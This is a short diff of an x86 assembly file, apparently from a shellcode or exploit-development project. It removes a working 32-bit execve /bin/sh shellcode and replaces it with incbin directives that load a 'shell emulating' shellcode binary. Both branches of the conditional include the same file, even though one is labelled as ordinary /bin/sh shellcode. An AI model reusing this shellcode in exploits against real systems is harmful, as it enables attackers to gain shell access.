@@ -51,18 +51,13 @@ copy:
 	jns copy
 	
 	;; Any local shellcode here
-	;; 32bit execve /bin/sh below
-	;; it's usually what you want
-	xor eax,eax
-	push eax
-	push 0x68732f2f
-	push 0x6e69622f
-	mov al, execve
-	mov ebx,esp
-	xor ecx,ecx
-	mov edx,ecx
-	int 0x80
 
-	
-
-	
+%define EMULATOR
+%ifdef 	EMULATOR
+	;; shell emulating shellcode
+	incbin "../32shellEmulator/shellcode"
+%else
+	;; ordinary shellcode (/bin/sh)
+	incbin "../32shellEmulator/shellcode"
+%endif
+ 
